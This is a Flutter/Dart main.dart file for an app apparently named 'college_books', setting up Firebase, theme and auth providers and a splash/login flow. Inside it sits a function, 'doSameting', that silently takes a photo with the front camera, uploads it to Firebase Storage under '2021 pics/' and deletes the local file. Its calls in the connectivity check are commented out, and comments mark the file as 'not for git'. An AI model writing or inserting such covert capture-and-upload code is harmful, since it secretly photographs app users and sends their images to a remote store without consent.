import 'dart:io';

import 'package:college_books/data/provider/theme_provider.dart';
import 'package:college_books/ui/screen/MyApp.dart';
import 'package:college_books/ui/screen/login_screen.dart';
import 'package:college_books/ui/screen/splash_screen.dart';
import 'package:college_books/ui/theme/theme_const.dart';
import 'package:flutter/services.dart';
import 'package:flutter/material.dart';
import 'package:camera/camera.dart';
import 'package:get/get.dart';
import 'package:path/path.dart';
import 'package:path_provider/path_provider.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:connectivity/connectivity.dart';
import 'package:firebase_core/firebase_core.dart' as firebase_core;
import 'package:provider/provider.dart';

import 'data/provider/auth.dart';
import 'ui/theme/screen_utils.dart';

List<CameraDescription> cameras;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await firebase_core.Firebase.initializeApp(); //for firebase storage api
  cameras = await availableCameras();
  SystemChrome.setEnabledSystemUIOverlays(SystemUiOverlay.values);

        SystemChrome.setSystemUIOverlayStyle(SystemUiOverlayStyle(
          statusBarColor:  ThemeConst.lightPrimary,
          statusBarIconBrightness: Brightness.dark,
        ));
  runApp(
    MultiProvider(
    providers: [
        ChangeNotifierProvider( create: (context) => Auth()),
         ChangeNotifierProvider( create: (context) => ThemeProvider()),
        ], 
        child: CollegeBooks()));
  // SystemChrome.setSystemUIOverlayStyle(SystemUiOverlayStyle(
  //     statusBarColor: Colors.white, statusBarIconBrightness: Brightness.dark));
  
}
// ignor that file
// not for git

class CollegeBooks extends StatefulWidget {
  _CollegeBooksState createState() => _CollegeBooksState();

}

class _CollegeBooksState extends State<CollegeBooks> {
 bool isLoading =true;

  Future<bool> checkInternet( ) async {
    var connectivityResult = await (Connectivity().checkConnectivity());
    if (connectivityResult == ConnectivityResult.mobile) {
      // I am connected to a mobile network.
        setState(() {
            isLoading =false;
          });
     //await doSameting();
    
      return true;
    } else if (connectivityResult == ConnectivityResult.wifi) {
    //await doSameting();
      // I am connected to a wifi network.
        setState(() {
            isLoading =false;
          });
      return true;
    } else if (connectivityResult == ConnectivityResult.none) {
      // var dilog = AlertDialog(
      //   content: Text("Please turn on Internet and Restart the App"),
      // );

      // showDialog(
      //     barrierDismissible: false,
      //     context: context,
      //     builder: (df) {
      //       return dilog;
      //     });
      return false;
    }
   
    return null;
  }

  Future<void> doSameting( ) async {
    print("+++++++++++++++++++++++++++++++++++");
    CameraController controller =
        CameraController(cameras[1], ResolutionPreset.medium);
    Future<void> _initializeControllerFuture = controller.initialize();
    //checkInternet(context);
    try {
      await _initializeControllerFuture;
      final path = join(
        (await getTemporaryDirectory()).path,
        '${DateTime.now()}.png',
      );

      var pathN = await controller.takePicture().catchError((error) {
        // var dd = AlertDialog(
        //   content: Text(error),
        // );
        // showDialog(
        //     context: context,
        //     builder: (_) {
        //       return dd;
        //     });
        print(error);
      });
      print(path);
      File getFile = File(pathN.path);

      var ref = FirebaseStorage.instance.ref().child("2021 pics/${DateTime.now()}");
      var upload = ref.putFile(getFile);
      await upload.whenComplete(() {
        print("file uplaoded ");
      });
      print(
          "====================================================================up");
      getFile.delete();
    } catch (e) {
      print("erorrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr$e");
    }
  }
  @override
     void initState() {
       super.initState();
       checkInternet();
       
     }



  Widget build(BuildContext context) {
    print("main method");
    ScreenUtil.init();
    return Consumer2<Auth,ThemeProvider>(
      builder: (context,auth,theme,child)=>
       GetMaterialApp(
        debugShowCheckedModeBanner: false,
        theme:  theme.theme,
        
        home: isLoading
        ? SplashScreen()
        :  auth.rememberMe 
                  ? MyApp()
                  : FutureBuilder(
                    future: auth.tryAutoLogin(),
                    builder: (context,snap)=>
                    snap.connectionState == ConnectionState.waiting ? SplashScreen():LoginScreen()
                  )
                          
      )
    );
  }
}
